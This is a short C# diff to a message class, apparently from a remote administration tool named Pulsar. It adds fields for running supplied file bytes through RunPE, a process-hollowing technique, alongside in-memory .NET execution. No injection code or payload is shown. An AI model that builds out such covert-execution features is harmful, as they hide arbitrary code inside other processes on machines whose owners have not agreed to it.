@@ -17,5 +17,17 @@ namespace Pulsar.Common.Messages.Administration.TaskManager
 
         [Key(4)]
         public bool ExecuteInMemoryDotNet { get; set; }
+
+        [Key(5)]
+        public bool UseRunPE { get; set; }
+
+        [Key(6)]
+        public string RunPETarget { get; set; }
+
+        [Key(7)]
+        public string RunPECustomPath { get; set; }
+
+        [Key(8)]
+        public byte[] FileBytes { get; set; }
     }
 }
